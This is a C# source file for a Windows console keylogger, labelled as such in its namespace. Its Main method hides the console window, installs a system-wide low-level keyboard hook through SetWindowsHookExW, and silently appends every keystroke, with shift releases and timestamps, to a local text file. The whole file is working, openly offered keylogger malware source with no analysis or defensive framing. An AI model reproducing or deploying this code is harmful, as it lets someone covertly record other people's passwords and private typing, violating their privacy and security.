using System;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;


namespace ConsoleKeyloggerApp
{
    class Program
    {
        private const int SW_HIDE = 0x0;
        private const int HC_ACTION = 0x0;
        private const int WM_KEYUP = 0x0101;
        private const int WM_KEYDOWN = 0x0100;
        private const int WH_KEYBOARD_LL = 0xD;
        private const int VK_RETURN = 0x0D;
        private const int VK_LSHIFT = 0xA0;
        private const int VK_RSHIFT = 0xA1;
        private const int GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT = 0x00000002;
        private const string TextFilePath = @"C:\...";

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static readonly LowLevelKeyboardProc KeyboardProc = HookProcedure;

        #region DLL Imports
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern bool GetModuleHandleExW(int dwFlags, string lpModuleName, ref IntPtr phModule);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr SetWindowsHookExW(int idHook, LowLevelKeyboardProc lpfn, IntPtr hmod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        #endregion

        private static void InstallHookProcedure(LowLevelKeyboardProc keyboardProc)
        {
            using (Process process = Process.GetCurrentProcess())
            using (ProcessModule processModule = process.MainModule)
            {
                IntPtr phModule = IntPtr.Zero;
                GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                    processModule.ModuleName, ref phModule);

                SetWindowsHookExW(WH_KEYBOARD_LL, keyboardProc, phModule, 0);
            }
            return;
        }
        private static IntPtr HookProcedure(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode == HC_ACTION)
            {
                int _wParam = wParam.ToInt32();
                int _lParam = Marshal.ReadInt32(lParam);
                if (_wParam == WM_KEYDOWN)
                {
                    if (IsVK_NUMPAD(_lParam))
                    {
                        _lParam -= 0x30;
                    }

                    string vk_code =
                        (IsNumber(_lParam) || IsLetter(_lParam))
                        ? ((char)_lParam).ToString()
                        : "[" + ((Keys)_lParam).ToString() + "]";

                    File.AppendAllText(TextFilePath,
                        (_lParam == VK_RETURN)
                        ? vk_code + Environment.NewLine
                        : vk_code);
                }
                else if (_wParam == WM_KEYUP)
                {
                    if (_lParam == VK_LSHIFT || _lParam == VK_RSHIFT)
                    {
                        File.AppendAllText(TextFilePath,
                            "[" + ((Keys)_lParam).ToString() + "]");
                    }
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
        private static bool IsVK_NUMPAD(int vkCode)
        {
            return (vkCode >= 0x60 && vkCode <= 0x69);
        }
        private static bool IsNumber(int vkCode)
        {
            return (vkCode >= 0x30 && vkCode <= 0x39);
        }
        private static bool IsLetter(int vkCode)
        {
            return (vkCode >= 0x41 && vkCode <= 0x5A);
        }
        private static void TimestampTextFile()
        {
            File.AppendAllText(TextFilePath,
                Environment.NewLine +
                DateTime.Now + Environment.NewLine +
                Environment.NewLine);
            return;
        }
        static void Main()
        {
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            InstallHookProcedure(KeyboardProc);
            TimestampTextFile();
            Application.Run();
        }
    }
}
